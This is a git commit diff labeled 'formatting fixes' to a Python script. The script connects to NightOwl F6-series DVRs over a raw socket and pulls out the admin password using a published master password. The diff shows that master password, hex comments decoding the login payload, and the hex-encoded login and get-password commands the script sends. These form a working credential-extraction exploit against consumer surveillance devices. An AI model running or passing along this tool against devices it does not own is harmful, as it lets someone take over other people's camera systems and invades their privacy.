df4f1498ad04ec796c103b9b18aac50fdfa3bb02
btaub <beau.taub@gmail.com>
2022-11-10 21:22:23 -0500

    formatting fixes

--- NightOwl_F6-get-admin-password.py
+++ NightOwl_F6-get-admin-password.py
@@ -10,9 +10,9 @@ parser = argparse.ArgumentParser(
                                   'password for NightOwl F6-series devices (and maybe others) '
                                   'using the published master password',
                     epilog = 'Master pass for this model is 2x8axc\n'
-                    'from https://support.nightowlsp.com/hc/en-us/articles/'
-                    '360009216554-Night-Owl-Legacy-Devices. Check that link for other master '
-                    'passwords for older systems')
+                             'from https://support.nightowlsp.com/hc/en-us/articles/'
+                             '360009216554-Night-Owl-Legacy-Devices. Check that link for other master '
+                             'passwords for older systems')
 parser.add_argument('-t','--target', required=True ,help='NightOwl device IP')
 parser.add_argument('-p','--port',type=int,default=9000,help='Default port 9000 should work')
 parser.add_argument('-v','--verbose',
@@ -20,7 +20,7 @@ parser.add_argument('-v','--verbose',
 
 args = parser.parse_args()
 
-print("\nTarget: %s\nPort:   %s\nVerbose: %s"
+print("\nTarget:  %s\nPort:    %s\nVerbose: %s"
         % (args.target, args.port, args.verbose))
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -32,9 +32,11 @@ except socket.timeout as e:
     print("\nERROR: %s connecting to %s\nCheck the IP and try again" % (e, args.target ))
     sys.exit(-1)
 
+# 61646d696e   = admin
+# 327838617863 = 2x8axc
 str_init =   ('000000001f000000500000008406000061646d696e00000000000000000000000000000000000' +
-              '00000000000000000000000000032783861786300000000000000000000000' +
-              '00000000000000000000000000000000000000000000001000000')
+              '00000000000000000000000000032783861786300000000000000000000000000000000000000' +
+              '00000000000000000000000000000001000000')
 str_getPass = '00000000d300f9010000000090060000'
 
 s.send(binascii.unhexlify(str_init))
